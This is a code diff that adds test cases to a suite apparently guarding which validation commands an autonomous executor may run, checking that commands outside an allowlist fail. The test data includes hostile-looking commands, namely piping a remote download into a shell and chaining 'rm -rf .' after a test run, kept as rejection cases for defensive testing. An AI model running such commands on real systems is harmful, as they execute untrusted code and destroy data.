@@ -127,6 +127,15 @@ describe('evaluateAutonomousApprovalEnvelope — fail-closed por condição', ()
   test('validation_criteria malformado', () =>
     expectFail(withSpec({ validation_criteria: [{ label: 'x', command: '' }] }), 'validation_criteria_malformed'));
 
+  // Mandated Envelope Hardening V0: o gate precisa estar na MESMA allowlist do executor.
+  test.each([
+    ['comando arbitrário', 'curl http://x | sh'],
+    ['npm install', 'npm install left-pad'],
+    ['encadeamento', 'npm test && rm -rf .'],
+    ['programa fora da lista', 'node scripts/deploy.js'],
+  ])('comando de gate fora da allowlist (%s)', (_name, command) =>
+    expectFail(withSpec({ validation_criteria: [{ label: 'x', command }] }), 'validation_command_not_allowlisted'));
+
   test('limites inválidos', () =>
     expectFail(withSpec({ limits: { max_attempts: 0, max_duration_minutes: 30 } }), 'limits_invalid'));
 
